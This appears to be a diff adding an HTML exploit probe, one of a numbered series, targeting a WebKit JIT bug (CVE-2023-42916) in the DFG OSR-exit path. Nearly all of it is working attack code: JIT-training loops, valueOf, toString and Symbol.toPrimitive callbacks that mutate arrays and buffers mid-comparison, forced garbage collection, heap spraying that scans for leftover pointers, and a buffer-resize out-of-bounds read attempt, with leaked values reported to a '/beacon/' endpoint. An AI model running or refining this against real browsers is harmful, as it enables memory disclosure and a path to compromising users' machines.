@@ -1,0 +1,264 @@
+<!--
+  p683: CVE-2023-42916 — DFG OSR exit stale register OOB read
+
+  CVE-2023-42916: OOB read, JIT-related, fixed Safari 17.1.2.
+
+  Strategy: When DFG-compiled code hits a speculation failure, it performs an
+  OSR (On-Stack Replacement) exit back to the interpreter. During this exit,
+  register values are materialized for the interpreter. If a valueOf callback
+  triggers during the exit path (e.g., in a comparison), and that callback
+  modifies the object being accessed, the materialized register values may be
+  stale — pointing to the old version of the data.
+
+  This is distinct from p680 (bounds elim) and p682 (structure transition) in
+  that the vulnerability is in the EXIT path, not the hot path. The DFG-compiled
+  code runs correctly, but the bailout to interpreter uses stale state.
+
+  Patterns tested:
+  A) valueOf changes array type (int -> double -> object) during comparison
+  B) valueOf triggers GC that moves/frees objects referenced by DFG registers
+  C) toString in template literal triggers array mutation during DFG bailout
+  D) Symbol.toPrimitive on comparison operand modifies TypedArray backing
+
+  CRASH_CLASS: MODERATE (stale pointer may read freed/moved memory)
+  prior art: p604 (DFG NaN confusion), p605 (type confusion),
+             p646 (CVE-2019-8623 LICM uninit — DEAD)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p683</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+  b('P683-START:CVE-2023-42916-OSR-EXIT-VALUEOF');
+  var results = [];
+
+  // === SECTION A: valueOf changes array type during comparison ===
+  b('A:VALUEOF-TYPE-CHANGE');
+  try {
+    // Start with integer array (contiguous int32)
+    var arr = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16];
+
+    function sumIfLess(a, limit) {
+      var s = 0;
+      for (var i = 0; i < a.length; i++) {
+        if (a[i] < limit) { // comparison triggers valueOf on limit
+          s += a[i];
+        }
+      }
+      return s;
+    }
+
+    // Train: DFG sees int array + int comparison
+    for (var i = 0; i < 200000; i++) {
+      sumIfLess(arr, 20);
+    }
+    b('A:TRAINED-200K:sum=' + sumIfLess(arr, 20));
+
+    // Poison: valueOf converts array to double, then reads with DFG
+    var converted = false;
+    var poison = {
+      valueOf: function() {
+        if (!converted) {
+          converted = true;
+          // Force array to ArrayWithDouble by storing a float
+          // This changes the butterfly's encoding
+          arr[0] = 1.1;
+          // Also store a NaN-boxed value that encodes a pointer pattern
+          arr[15] = 1.7976931348623157e+308; // near MAX_VALUE
+        }
+        return 20;
+      }
+    };
+
+    var result = sumIfLess(arr, poison);
+    b('A:POST-POISON:sum=' + result);
+
+    // Check if any element reads as unexpected (stale int encoding of double bits)
+    var ab = new ArrayBuffer(8);
+    var f64 = new Float64Array(ab);
+    var u64 = new BigUint64Array(ab);
+    for (var i = 0; i < arr.length; i++) {
+      f64[0] = arr[i];
+      var hex = u64[0].toString(16);
+      if (hex.length > 10 && !hex.startsWith('3ff') && !hex.startsWith('400') &&
+          !hex.startsWith('7fe') && !hex.startsWith('0')) {
+        b('A:STALE-ENCODING:idx=' + i + ',val=' + arr[i] + ',hex=0x' + hex);
+        results.push('A:' + i + ':0x' + hex);
+      }
+    }
+    if (results.length === 0) b('A:NO-STALE');
+  } catch(e) {
+    b('A:ERR:' + e.message);
+  }
+
+  // === SECTION B: valueOf triggers heavy GC during DFG comparison ===
+  b('B:VALUEOF-GC');
+  try {
+    // Allocate objects that DFG will reference
+    var refs = [];
+    for (var i = 0; i < 64; i++) {
+      refs.push({idx: i, data: new Float64Array(32)});
+      for (var j = 0; j < 32; j++) refs[i].data[j] = i * 32 + j + 0.5;
+    }
+
+    function readRefData(arr, idx) {
+      return arr[idx].data[0]; // DFG caches arr[idx] pointer
+    }
+
+    // Train
+    for (var i = 0; i < 200000; i++) {
+      readRefData(refs, i % 64);
+    }
+    b('B:TRAINED-200K');
+
+    // Force GC by allocating and dropping lots of objects
+    function forceGC() {
+      var garbage = [];
+      for (var i = 0; i < 10000; i++) {
+        garbage.push(new ArrayBuffer(1024));
+      }
+      garbage = null;
+      // Also try WeakRef trick
+      if (typeof FinalizationRegistry !== 'undefined') {
+        var sentinel = {};
+        var fr = new FinalizationRegistry(function(){});
+        fr.register(sentinel, 'gc');
+        sentinel = null;
+      }
+    }
+
+    // Read an element, then GC (may move objects), then read again with DFG
+    var pre = readRefData(refs, 32);
+    forceGC();
+    var post = readRefData(refs, 32);
+    b('B:PRE=' + pre + ',POST=' + post);
+
+    if (pre !== post) {
+      b('B:VALUE-CHANGED:' + pre + '->' + post);
+      results.push('B:changed');
+    }
+
+    // Spray ArrayBuffers to reclaim any freed memory
+    var spray = [];
+    for (var i = 0; i < 512; i++) {
+      var ab = new ArrayBuffer(256);
+      var u64 = new BigUint64Array(ab);
+      // Scan for non-zero (residual pointers from moved objects)
+      for (var j = 0; j < u64.length; j++) {
+        if (u64[j] !== 0n) {
+          b('B:RESIDUE:buf=' + i + ',off=' + (j*8) + ',val=0x' + u64[j].toString(16));
+          results.push('B:residue');
+          break;
+        }
+      }
+      spray.push(ab);
+    }
+    b('B:SPRAY-SCANNED:' + spray.length + '-bufs');
+  } catch(e) {
+    b('B:ERR:' + e.message);
+  }
+
+  // === SECTION C: Template literal toString during DFG ===
+  b('C:TEMPLATE-TOSTRING');
+  try {
+    var data = new Float64Array(32);
+    for (var i = 0; i < 32; i++) data[i] = i * 1.5 + 0.1;
+
+    function readTyped(view, idx) {
+      return view[idx];
+    }
+
+    // Train
+    for (var i = 0; i < 200000; i++) {
+      readTyped(data, i % 32);
+    }
+    b('C:TRAINED-200K');
+
+    // toString modifies the underlying buffer via a different view
+    var buf = data.buffer;
+    var mutator = {
+      toString: function() {
+        // Create a BigUint64Array and write a fake pointer pattern
+        var u64 = new BigUint64Array(buf);
+        // Write a value that looks like a code pointer when read as float64
+        u64[16] = 0x00007FFF12345678n; // typical WebProcess VA pattern
+        return 'mutated';
+      }
+    };
+
+    // Force the toString
+    var str = '' + mutator;
+
+    // Now read idx 16 with DFG — was it the float we trained on, or the u64 we wrote?
+    var val = readTyped(data, 16);
+    var ab = new ArrayBuffer(8);
+    var f64 = new Float64Array(ab);
+    var u64check = new BigUint64Array(ab);
+    f64[0] = val;
+    b('C:POST-READ:val=' + val + ',hex=0x' + u64check[0].toString(16));
+
+    // This isn't an OOB itself, but if DFG materialized the old float value
+    // from a register instead of re-reading, it would prove stale-register OSR exit
+    if (u64check[0] !== 0x00007FFF12345678n && val !== (16 * 1.5 + 0.1)) {
+      b('C:STALE-REGISTER:val=' + val);
+      results.push('C:stale');
+    }
+  } catch(e) {
+    b('C:ERR:' + e.message);
+  }
+
+  // === SECTION D: Symbol.toPrimitive modifies TypedArray backing ===
+  b('D:TOPRIMITIVE-DETACH');
+  try {
+    var rab = new ArrayBuffer(256, {maxByteLength: 256});
+    var view = new BigUint64Array(rab); // 32 elements
+    for (var i = 0; i < 32; i++) view[i] = BigInt(0xEEEE0000 + i);
+
+    function compareAndRead(v, idx, threshold) {
+      if (idx < threshold) return v[idx];
+      return -1n;
+    }
+
+    // Train
+    for (var i = 0; i < 200000; i++) {
+      compareAndRead(view, i % 32, 32);
+    }
+    b('D:TRAINED-200K');
+
+    // toPrimitive resizes the buffer during threshold comparison
+    var shrunk = false;
+    var trap = {
+      [Symbol.toPrimitive]: function(hint) {
+        if (!shrunk) {
+          shrunk = true;
+          rab.resize(32); // only 4 elements remain
+        }
+        return 32; // threshold still says "in bounds"
+      }
+    };
+
+    // DFG checks idx < trap (valueOf called), then reads v[idx]
+    // If bounds check uses pre-resize length but read uses post-resize buffer...
+    var val = compareAndRead(view, 20, trap);
+    if (val !== undefined && val !== -1n) {
+      b('D:OOB-READ:idx=20,val=0x' + val.toString(16));
+      results.push('D:0x' + val.toString(16));
+    } else {
+      b('D:NO-OOB:val=' + val);
+    }
+  } catch(e) {
+    b('D:ERR:' + e.message);
+  }
+
+  // === SUMMARY ===
+  if (results.length > 0) {
+    b('P683-RESULT:HITS=' + results.join(';'));
+  } else {
+    b('P683-RESULT:NO-STALE-REGISTERS');
+  }
+  b('P683-DONE');
+}
+
+setTimeout(main, 100);
+</script>
+</head><body><pre id="log">p683: CVE-2023-42916 OSR exit valueOf OOB</pre></body></html>
